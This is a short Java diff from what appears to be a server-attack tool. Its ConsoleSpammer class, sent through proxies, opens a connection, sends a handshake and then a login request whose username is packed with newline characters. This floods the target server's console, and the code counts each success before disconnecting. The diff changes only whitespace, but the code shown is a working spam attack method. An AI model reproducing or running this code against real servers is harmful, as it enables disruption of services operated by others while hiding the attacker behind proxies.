@@ -23,8 +23,11 @@ public class ConsoleSpammer implements IMethod {
 
 	public void accept(Channel channel, Proxy proxy) {
 		channel.writeAndFlush(Unpooled.buffer().writeBytes(handshake.getWrappedPacket()));
+		
 		channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(new SecureRandom().nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n").getWrappedPacket())));
+		
 		NettyBootstrap.service.success++;
+		
 		channel.close();
 	}
 }
